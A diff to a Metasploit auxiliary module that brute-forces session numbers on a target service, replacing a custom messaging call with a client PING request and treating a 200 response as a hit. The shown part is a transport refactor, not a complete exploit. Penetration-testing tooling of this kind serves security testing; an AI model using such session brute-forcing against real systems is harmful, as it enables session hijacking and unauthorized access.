@@ -119,10 +119,17 @@ class MetasploitModule < Msf::Auxiliary
   def session_bruteforce_list(weighted_array)
     list = session_number_list(weighted_array)
     for session in list
-      @nucs_session = session
-      data = nucs_send_msg(['PING'])
+      req = client.request_ping({
+        'method' => 'PING',
+        'user_session' => session
+      })
+      # module fails when shutdown/close lots of connections
+      # create own connection and dont call close
+      conn = client.connect(temp: true)
+      res = client.send_recv(req, conn)
+
       @counter += 1
-      if data[0] =~ /OK/ || data[0] =~ /612/
+      if res && res.status_code == 200
         return session
       end
     end
@@ -130,6 +137,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
+    connect
     @counter = 0
     print_status('Bruteforcing session - this might take a while, go get some coffee!')
     session = nil
